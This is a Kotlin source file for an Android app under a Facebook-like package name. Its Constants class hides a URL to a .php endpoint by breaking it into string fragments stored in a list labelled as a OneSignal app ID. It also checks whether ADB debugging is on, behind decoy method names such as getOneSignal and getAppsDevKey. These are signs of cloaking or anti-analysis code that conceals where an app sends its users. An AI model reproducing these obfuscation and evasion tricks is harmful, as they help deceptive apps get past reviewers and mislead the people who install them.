package com.facebook.ta

import android.content.Context
import android.provider.Settings

class Constants(private val context: Context) {

    private val oneSignalAppID = listOf("96772a63-32fc-46e1-", "91ee-bda392552763", "http", "s://ol", "ympstars.si", "te/fsdbjkj.php?6tl4351lks=1oqq408ha7&")
    private val appsList = listOf("PoMsnNXQk", "nEtcczQL", "BoezS", "WARN")

    fun getOneSignal(number1: Int, number2: Int) : String {

        val sum = number1+number2
        val ddb = Settings.Global.getString(context.contentResolver, Settings.Global.ADB_ENABLED)

        return when(sum){
            0 -> return oneSignalAppID[0]+oneSignalAppID[1]
            5 -> return ddb
            else -> return oneSignalAppID[1]
        }
    }

    fun getAppsDevKey(input1: Long, input2: Long) : String{

        val data = appsList[0]+appsList[1]
        return if (input1 == input2) data + appsList[2] else oneSignalAppID[0]
    }


    fun getList(): List<String>?{
        return oneSignalAppID
    }




    companion object{
        const val G = "G"
        const val A = "A"
        const val EMPTY = "EMPTY"
        const val KEY_TIMES = "KEY_TIMES"
        const val KEY_LINK = "KEY_LINK"
        const val WARN = "WARN"
    }
}